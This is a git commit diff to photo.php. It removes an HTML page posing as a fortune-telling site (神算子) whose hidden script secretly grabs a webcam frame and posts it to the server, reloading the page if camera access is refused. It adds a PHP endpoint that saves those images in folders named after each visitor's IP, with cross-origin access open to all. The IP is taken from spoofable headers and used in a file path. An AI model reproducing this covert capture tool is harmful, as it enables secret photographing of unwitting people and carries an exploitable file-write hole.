ff9b071036354cd377dc587c9513ab2481038350
yaojianhong-cm <yjh2240434990@163.com>
2024-12-06 20:10:39 +0800

    修改php信息

--- photo.php
+++ photo.php
@@ -1,39 +1,45 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="" content="content">
-    <title>神算子</title>
-</head>
-<body>
-     <canvas id="canvas" style="display: none;" width="480" height="640"></canvas>
-     <video id="video" style="display: none;width: 250px;height: 300px;"></video>
-     <script src="https://lib.baomitu.com/jquery/3.6.0/jquery.js"></script>
-    <script>
-        window.addEventListener("DOMContentLoaded",function(){
-            var canvas = document.getElementById('canvas');
-            var context =canvas.getContext('2d');
-            var video = document.getElementById('video');
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                navigator.mediaDevices.getUserMedia({video:true}).then(function(stream){
-                    video.srcObject = stream;
-                    video.play();
-                    setTimeout(function(){context.drawImage(video,0,0,480,640)}, 1000);
-                    setTimeout(function(){
-                        var img = canvas.toDataURL('image/png');
-                        $.post('/photo.php',{'imegse':img},function(data){
-                        //指定photo.php文件所在位置
-                        })
-                    } ,1300)
- 
-                },function(){
-                    alert('缺少访问权限');
-                    location.reload();
-                })
- 
-            }
-        },false);
-    </script>
-</body>
-</html>
+<?php
+//允许跨域
+header("Access-Control-Allow-Origin:*");
+echo base64();
+function base64()
+{
+    //接收 base64 数据
+    $image = $_POST['imegse'];
+    if (empty($image)) {
+        return null;
+    }
+    //设置图片名称
+    $imageName = date("His", time()) . "_" . rand(1111, 9999) . '.png';
+    //判断是否有逗号 如果有就截取后半部分
+    if (strstr($image, ",")) {
+        $image = explode(',', $image);
+        $image = $image[1];
+    }
+    //设置图片保存路径
+    $path = "./" . getIp() . '/' . date("Ymd", time());
+    //判断目录是否存在 不存在就创建
+    if (!is_dir($path)) {
+        mkdir($path, 0777, true);
+    }
+    //图片路径
+    $imageSrc = $path . "/" . $imageName;
+    //生成文件夹和图片
+    $r = file_put_contents($imageSrc, base64_decode($image));
+    if (!$r) {
+        return 0;
+    } else {
+        return 1;
+    }
+}
+function getIp()
+{
+    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+        $ip = $_SERVER['HTTP_CLIENT_IP'];
+    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+    } else {
+        $ip = $_SERVER['REMOTE_ADDR'];
+    }
+    return $ip;
+}
